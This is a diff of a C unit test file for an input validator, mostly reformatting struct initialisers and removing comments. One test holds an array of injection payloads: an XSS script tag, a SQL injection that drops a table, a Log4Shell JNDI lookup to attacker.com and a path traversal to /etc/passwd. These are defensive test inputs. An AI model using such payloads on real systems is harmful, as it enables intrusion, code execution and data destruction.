@@ -1,9 +1,9 @@
 // SPDX-FileCopyrightText: 2025-2026 SPHARX Ltd.
 // SPDX-License-Identifier: AGPL-3.0-or-later OR Apache-2.0
+
 /**
  * @file test_input_validator.c
  * @brief 输入验证器单元测试 (TeamC)
- * @copyright (c) 2026 SPHARX. All Rights Reserved.
  * 对齐: 新版 input_validator.h API (VALIDATE_STRING+min_len/max_len)
  */
 
@@ -116,8 +116,10 @@ static int test_validate_length_limits(void)
     cJSON *data = cJSON_CreateObject();
     cJSON_AddStringToObject(data, "password", "abc123");
 
-    validation_rule_t rule = {
-        .type = VALIDATE_STRING, .field_name = "password", .min_len = 4, .max_len = 20};
+    validation_rule_t rule = {.type = VALIDATE_STRING,
+                              .field_name = "password",
+                              .min_len = 4,
+                              .max_len = 20};
     validator_add_rule(v, &rule);
 
     validation_result_t *result = validator_validate(v, data);
@@ -222,8 +224,6 @@ static int test_multiple_rules(void)
     return 0;
 }
 
-/* ========== Round 8: 边界测试扩展 (C-W1-003) ========== */
-
 static int test_null_input_handling(void)
 {
     printf("  test_null_input_handling...\n");
@@ -272,8 +272,10 @@ static int test_oversized_input(void)
     cJSON *data = cJSON_CreateObject();
     cJSON_AddStringToObject(data, "field", long_str);
 
-    validation_rule_t rule = {
-        .type = VALIDATE_STRING, .field_name = "field", .min_len = 1, .max_len = 256};
+    validation_rule_t rule = {.type = VALIDATE_STRING,
+                              .field_name = "field",
+                              .min_len = 1,
+                              .max_len = 256};
     validator_add_rule(v, &rule);
 
     validation_result_t *result = validator_validate(v, data);
@@ -306,17 +308,21 @@ static int test_special_characters_injection(void)
 
     validation_result_t *v = validator_create();
 
-    const char *injection_strings[] = {
-        "<script>alert('xss')</script>", "' OR \"1\"=\"1\"; DROP TABLE users; --",
-        "${jndi:ldap://attacker.com/a}", "..%2F..%2Fetc%2Fpasswd",
-        "\x00\x01\x02\x03\x04",          NULL};
+    const char *injection_strings[] = {"<script>alert('xss')</script>",
+                                       "' OR \"1\"=\"1\"; DROP TABLE users; --",
+                                       "${jndi:ldap://attacker.com/a}",
+                                       "..%2F..%2Fetc%2Fpasswd",
+                                       "\x00\x01\x02\x03\x04",
+                                       NULL};
 
     for (int i = 0; injection_strings[i] != NULL; i++) {
         cJSON *data = cJSON_CreateObject();
         cJSON_AddStringToObject(data, "input", injection_strings[i]);
 
-        validation_rule_t rule = {
-            .type = VALIDATE_STRING, .field_name = "input", .min_len = 1, .max_len = 256};
+        validation_rule_t rule = {.type = VALIDATE_STRING,
+                                  .field_name = "input",
+                                  .min_len = 1,
+                                  .max_len = 256};
         validator_add_rule(v, &rule);
 
         validation_result_t *result = validator_validate(v, data);
@@ -351,8 +357,10 @@ static int test_boundary_exact_match(void)
     cJSON *data = cJSON_CreateObject();
     cJSON_AddStringToObject(data, "field", exact_4);
 
-    validation_rule_t rule = {
-        .type = VALIDATE_STRING, .field_name = "field", .min_len = 4, .max_len = 20};
+    validation_rule_t rule = {.type = VALIDATE_STRING,
+                              .field_name = "field",
+                              .min_len = 4,
+                              .max_len = 20};
     validator_add_rule(v, &rule);
 
     validation_result_t *result = validator_validate(v, data);
@@ -445,7 +453,6 @@ int main(void)
     test_convenience_functions();
     test_multiple_rules();
 
-    /* ========== Round 8: 边界测试扩展 (C-W1-003) ========== */
     test_null_input_handling();
     test_oversized_input();
     test_special_characters_injection();
